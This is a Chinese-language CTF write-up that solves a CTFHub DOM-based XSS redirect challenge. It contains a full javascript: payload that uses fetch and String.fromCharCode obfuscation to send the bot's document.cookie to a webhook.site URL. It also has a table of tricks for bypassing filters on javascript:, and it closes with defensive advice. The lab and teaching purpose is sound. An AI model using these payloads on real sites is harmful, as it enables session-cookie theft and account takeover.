---
title: CTFHub XSS DOM跳转
date: 2026-10-16
categories: CTFHub Web XSS DOM 
tags: CTFHub Web XSS DOM 
---
# 题目: CTFHub XSS DOM跳转

## 题目描述
打开题目页面，界面非常简单，主要包含两个功能区：
JumpTo 输入区：一个输入框和一个 Submit 按钮，但两者都是灰色不可编辑状态。
Send URL to Bot 区：一个 URL 输入框和一个 Send 按钮，可以向后台机器人发送 URL。
页面标题为：XSS DOM JumpTo ?
初步判断： 这是一道典型的 DOM 型 XSS 题目，攻击点应该在前端 JavaScript 对 URL 参数的处理上。

## 解题思路
### 源码分析
按 F12 或 Ctrl+U 查看页面源码，定位到关键 JS 代码：
var target = location.search.split("=")
if (target[0].slice(1) == 'jumpto') {
    location.href = target[1];
}
代码逻辑解读：
1. location.search 获取 URL 中 ? 后面的部分（如 ?jumpto=xxx）。
2. .split("=") 按 = 切割，得到数组 ["?jumpto", "xxx"]。
3. target[0].slice(1) 去掉第一个字符 ?，判断是否等于 jumpto。
4. 如果成立，则执行 location.href = target[1]，即跳转到参数值指定的 URL。
漏洞点： 参数 jumpto 的值可控，且被直接赋值给 location.href，没有做任何过滤。这意味着我们可以控制页面跳转。

## 攻击思路
目标是让机器人访问我们构造的恶意 URL，触发 XSS，然后把机器人的 Cookie 发送到我们控制的服务器。
关键问题：
如何执行 JavaScript 代码？→ 使用 javascript: 伪协议。
如何把 Cookie 外带出去？→ 使用 fetch 请求 Webhook。
如何绕过浏览器对 javascript: 的拦截和引号转码？→ 使用 String.fromCharCode()。

## 攻击链
text
机器人访问恶意 URL
    ↓
页面执行 location.href = "javascript:..."
    ↓
执行 fetch 请求，将 document.cookie 发送到 Webhook
    ↓
我们在 Webhook 收到带 flag 的 Cookie

## 解题步骤
1. 准备 Cookie 接收平台
访问 Webhook.site，获取一个专属的接收 URL
https://webhook.site/92929b62-f212-4f00-863f-9217bec9899f
任何访问该 URL 的请求都会被记录，包括 URL 参数、Referer、User-Agent 等。

2. 验证漏洞点
在浏览器地址栏访问：
http://challenge-xxxx.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)
结果： 页面弹出弹窗，说明 jumpto 参数确实可以执行 JavaScript 代码。

3. 构造外带 Payload
尝试直接使用带引号的 Payload：
?jumpto=javascript:fetch('https://webhook.site/xxx/?c='+document.cookie)
结果： 页面白屏，Webhook 没有收到请求。通过 F12 控制台发现，浏览器把 ' 转码成了 %27，导致 JS 语法错误。

4. 使用无引号 Payload（核心绕过）
为了避免引号被转码，使用 String.fromCharCode() 把 URL 字符串转成 ASCII 码：
javascript
javascript:fetch(
  String.fromCharCode(
    104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,
    57,50,57,50,57,98,54,50,45,102,50,49,50,45,52,102,48,48,45,56,54,51,102,45,
    57,50,49,55,98,101,99,57,56,57,57,102,47,63,99,61
  ) + document.cookie
)
上面的 ASCII 码对应字符串：
https://webhook.site/92929b62-f212-4f00-863f-9217bec9899f/?c=

5. 构造完整 URL 发送给 Bot
将 Payload 拼接到题目 URL：
http://challenge-50eced0c8e541254.sandbox.ctfhub.com:10800/?jumpto=javascript:fetch(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,57,50,57,50,57,98,54,50,45,102,50,49,50,45,52,102,48,48,45,56,54,51,102,45,57,50,49,55,98,101,99,57,56,57,57,102,47,63,99,61)+document.cookie)
复制该 URL，粘贴到题目页面的 Send URL to Bot 输入框，点击 Send。

6. 获取 Flag
稍等几秒，返回 Webhook.site 页面刷新，可以看到一条新请求：
https://webhook.site/92929b62-f212-4f00-863f-9217bec9899f/?c=flag=ctfhub{76940896d130c7d4fec8e35a}
Flag：
ctfhub{76940896d130c7d4fec8e35a}
提交至 CTFHub，通关成功！

## 踩坑指南
1. 参数名猜错
表现： 一开始以为是 target 参数（因为 input 的 id 是 target），实际是 jumpto。
解决： 一定要看源码，源码里写得很清楚：target[0].slice(1) == 'jumpto'。

2. URL 结构写错
表现： 直接把 payload 拼在域名后面：
http://challenge-xxx:10800/javascript:fetch(...)
结果： 页面返回 404 Not Found。
原因： 漏掉了 ?jumpto= 参数部分，服务器把整段当作路径解析。
正确写法：
http://challenge-xxx:10800/?jumpto=javascript:fetch(...)

3. 引号被浏览器自动转码
表现： 使用带单引号的 Payload，页面白屏，Webhook 收不到请求。
原因： 浏览器把 URL 里的 ' 自动转码成 %27，破坏 JS 语法。
解决： 使用 String.fromCharCode() 替代引号，把 URL 转成 ASCII 码数组。

4. javascript: 被浏览器拦截
表现： 使用 location.href='...' 时，Webhook 收不到请求。
原因： 现代浏览器对 location.href = "javascript:..." 有安全限制，不允许执行。
解决：
使用 fetch 替代 location.href
使用 String.fromCharCode() 绕过引号检查
用 %0a、%0d 等换行符尝试绕过（本题未成功，但其他题目可用）

5. Webhook 收到 ?c=(empty)
表现： Webhook 显示 URL 是 ?c=，但值为空。
原因： Payload 里 ?c= 后面直接拼接 document.cookie，但由于语法错误（引号被转码），JS 未执行，所以 Cookie 没拼上。
解决： 用 String.fromCharCode() 重构 Payload，避免引号问题。

6. Referer 不包含 Cookie
表现： 收到的 Referer 只有域名，没有 Cookie。
原因： 浏览器跨域跳转时，Referer 默认只保留源站域名，不保留路径和参数（Referrer-Policy 默认 strict-origin-when-cross-origin）。
解决： 不要指望 Referer 泄露 Cookie，应该用 fetch 主动外带。

## 知识点总结
1. DOM 型 XSS
定义： 漏洞出现在前端 JavaScript 代码中，用户输入被直接操作 DOM，没有经过服务端。
函数	|说明
location.href	URL| 跳转
innerHTML	|插入HTML
document.write	|写入文档
eval	|执行字符串代码
setTimeout / setInterval	|定时执行

2. JavaScript 伪协议
定义： javascript: 是 URL 的一种协议，用于在浏览器中执行 JavaScript 代码。
使用场景：
<a href="javascript:alert(1)">click</a>
安全限制：
现代浏览器在 location.href = "javascript:..." 场景下有拦截。
在 <a> 标签的 href 中相对宽松。
在 iframe、表单等场景下也可能被拦截。
绕过技巧：

技巧|示例|说明
换行符|java%0ascript:|插入换行符绕过字符串匹配
Tab	|java%09script:|插入 Tab 字符
回车|java%0dscript:|插入回车符
HTML 实体|javascript&colon;|编码冒号
大小写|JavaScript:|有些过滤器只匹配小写

3. 无引号外带技巧
为什么需要？ URL 里的引号会被浏览器转码成 %27，破坏 JS 语法。
解决方案： 使用 String.fromCharCode() 把字符串转换成 ASCII 码数组。
优势：
完全避免引号
避免被 URL 转码
绕过字符串匹配检测

4. Webhook 外带
定义： 使用第三方平台（如 Webhook.site、RequestBin）接收目标机器发出的请求，从而窃取敏感数据。
使用场景：
XSS 窃取 Cookie
SSRF 外带数据
命令执行外带结果
XXE 外带文件内容

优势：
无需自建服务器
实时查看请求
可查看完整的请求头、请求体

5. Referrer-Policy
定义： 浏览器发送 Referer 头的策略。
常见值：

值|说明
no-referrer|不发送 Referer
same-origin|同源才发送
strict-origin|只发送域名
strict-origin-when-cross-origin|跨域只发域名（默认）
unsafe-url|发送完整 URL
本题体现： 跨域跳转时，Referer 只有域名，没有完整路径。所以不能依赖 Referer 泄露 Cookie。

6. 防御建议
针对 DOM 型 XSS，开发者可以采取以下防护措施：
避免直接使用 location.href：对跳转地址做白名单校验。
过滤 javascript: 协议：使用 startsWith('javascript:') 检测并拦截。
使用 innerText 替代 innerHTML：避免 HTML 注入。
设置 HttpOnly：防止 JS 读取 Cookie。
设置 CSP：内容安全策略，限制脚本执行来源。
设置 Referrer-Policy：防止敏感信息通过 Referer 泄露。


